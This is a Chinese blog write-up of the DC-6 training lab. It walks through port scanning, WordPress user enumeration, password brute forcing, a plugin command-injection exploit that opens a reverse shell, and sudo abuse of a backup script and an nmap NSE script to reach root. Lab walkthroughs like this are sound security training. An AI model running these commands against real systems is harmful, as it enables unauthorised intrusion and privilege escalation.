---
link: https://blog.csdn.net/2403_88102829/article/details/157427756
title: dc6打靶报告
description: 文章浏览阅读61次。Activity Monitor插件存在命令注入，searchsploit扫一下看有没有执行脚本。发现开放端口：22（SSH）、80（HTTP），并提示域名。然后创建一个user列表文件，把刚刚我们扫到的用户名存进去。修改脚本中几个地方——靶机地址，攻击ip，攻击机开放端口。浏览器打开45274.html并提交，获得反向Shell。环境：kali ip：192.168.145.128。——从graham提权至root。→ 获得jens Shell。→ 获得root Shell。发现jens可执行nmap。
keywords: chrome,前端
author: Le_ee 博客等级 码龄1年
date: 2026-01-28T07:31:22.932Z
categories:
  - 靶场复现
tags:
  - DC靶场
  - 命令注入
  - Linux
publisher: null
stats: paragraph=74 sentences=67, words=169
---

<meta name="referrer" content="no-referrer"/>
环境：kali ip：192.168.145.128

`arp-scan -l` 发现存活靶机IP： `192.168.145.188`

![](https://i-blog.csdnimg.cn/direct/85e9c276968d49dda259954d777dcd96.png)

`nmap -A -sV -p- 192.168.145.188` 扫描端口

![](https://i-blog.csdnimg.cn/direct/c75943a607ca4ed896c3fca532529655.png)

发现开放端口：22（SSH）、80（HTTP），并提示域名 `wordy`

**然后进行域名解析**，因为80端口重定向到 `http://wordy`，需本地解析

`vim /etc/hosts` 添加： `192.168.145.188 wordy`

![](https://i-blog.csdnimg.cn/direct/4a72de19ecb74c52abaef7eacaa512cf.png)

![](https://i-blog.csdnimg.cn/direct/96d5cfe79e374d3ca0b59a4732ef35d4.png)

whatweb扫一下确定cms是wordpress

![](https://i-blog.csdnimg.cn/direct/5165ec2966444045b9470735a8de716a.png)

![](https://i-blog.csdnimg.cn/direct/9b14c4c4e39f452ab66b7e427fbf16db.png)

然后进行 **信息收集**

wpscan --url http://wordy --enumerate u --no-update

得到用户表

![](https://i-blog.csdnimg.cn/direct/e6beaf0da43e4b7481e31d2d2fab819f.png)

`admin`, `mark`, `graham`, `sarah`, `jens`

`&#x5B98;&#x7F51;&#x6709;&#x4E2A;&#x5C0F;&#x63D0;&#x793A;`

![](https://i-blog.csdnimg.cn/direct/21e757da46e84752b206e939a5b5414a.png)

![](https://i-blog.csdnimg.cn/direct/cd57cbe325b74f6a99283e918087daeb.png)

`cat /usr/share/wordlists/rockyou.txt | grep k01 > ps.txt`

![](https://i-blog.csdnimg.cn/direct/61a961cfae41422dbcba4a58933e81a6.png)

生成密码文件 `password.txt`

然后创建一个user列表文件，把刚刚我们扫到的用户名存进去

![](https://i-blog.csdnimg.cn/direct/dc7e51fa173349d9bdda718fbd27f23f.png)![](https://i-blog.csdnimg.cn/direct/96675a66c39341fb80125c8da5161320.png)

开始爆破

`wpscan --url http://wordy -U user.txt -P ps.txt`

![](https://i-blog.csdnimg.cn/direct/ecdfa32c5c7644cf8a267bd6b2e4ec1a.png)

得到一组结果： `mark:helpdesk01`

![](https://i-blog.csdnimg.cn/direct/e3a1940e39774cf1993d8ee675c00264.png)

登陆成功

![](https://i-blog.csdnimg.cn/direct/735ab138017d40529d399868e33b0c42.png)

发现一个Activity on Wordy插件

![](https://i-blog.csdnimg.cn/direct/e86e85da2b204fee8ab73cf5f5aa320c.png)

**百度一下发现**Activity Monitor插件存在命令注入，searchsploit扫一下看有没有执行脚本

![](https://i-blog.csdnimg.cn/direct/6fb0d46cfdcb41c3a7d07f621a0885b0.png)

`45274.html&#xFF0C;html&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x66F4;&#x7B80;&#x5355;&#xFF0C;&#x5148;&#x8BD5;&#x8BD5;&#x8FD9;&#x4E2A;`

Kali监听： `nc -lvnp 1234`

修改脚本中几个地方——靶机地址，攻击ip，攻击机开放端口

Kali监听： `nc -lvnp 4443`

![](https://i-blog.csdnimg.cn/direct/2e0dcf28ff1942bb8ec7fa3e38bee7d1.png)

![](https://i-blog.csdnimg.cn/direct/3f91895123eb4f6b9bd6efa1a5ccb3b0.png)

![](https://i-blog.csdnimg.cn/direct/d4fe1d0a9efd40fa90ade86b1839491d.png)

浏览器打开45274.html并提交，获得反向Shell

file:///tmp/45274.html

![](https://i-blog.csdnimg.cn/direct/9e70569ea3ff48d19be263181c25bd10.png)

**权限提升（横向移动）——先**从mark用户提权至其他用户

python伪终端

![](https://i-blog.csdnimg.cn/direct/df9e9c85e4da4525b418bed3446ac0ad.png)

![](https://i-blog.csdnimg.cn/direct/8f75b470dbc44e23a8a3b8bea02cb85d.png)

在/home/mark目录发现文件： `/home/mark/things-to-do.txt`

![](https://i-blog.csdnimg.cn/direct/5b8ce21dff2e4a79a85fc066c933ae25.png)

得到一组密码信息，graham密码： `GSo7isUM1D4`

![](https://i-blog.csdnimg.cn/direct/71f7ad9a83324ae4854290dfa6b9d6ec.png)

SSH登录： `ssh graham@192.168.145.188`

![](https://i-blog.csdnimg.cn/direct/6b2a6a29e99849c7a3319358d0e713ff.png)

**继续权限提升（纵向提权）**——从graham提权至root

`sudo -l` 发现jens可执行 `/home/jens/backups.sh`

![](https://i-blog.csdnimg.cn/direct/3c8d2d0de85841d5b55068f0ad015e01.png)

向backups.sh注入命令：

`echo '/bin/bash' >> /home/jens/backups.sh`

切换用户： `sudo -u jens ./backups.sh` → 获得jens Shell

![](https://i-blog.csdnimg.cn/direct/1965cb0a1c084aceb437cd75e2864eed.png)

`sudo -l` 发现jens可执行nmap

![](https://i-blog.csdnimg.cn/direct/d9473335932e4e1d84844332eef5bd97.png)

创建恶意nse脚本： `echo 'os.execute("/bin/sh")' > kali.nse`

![](https://i-blog.csdnimg.cn/direct/73f302f61a164e81a0f80a391ead1a92.png)

`sudo nmap --script=kali.nse` → 获得root Shell

![](https://i-blog.csdnimg.cn/direct/4b5d15d502444af48d72efb62bb250fc.png)

![](https://i-blog.csdnimg.cn/direct/dc2f529c6fae4bca8cb111f9f575c00b.png)

![](https://i-blog.csdnimg.cn/direct/2e61a94c8c2a4ff1a6dfdc068bfc390f.png)

![](https://i-blog.csdnimg.cn/direct/6378022e3a41458b9f95ee4ea13c18a0.png)

完结撒花！！！！！
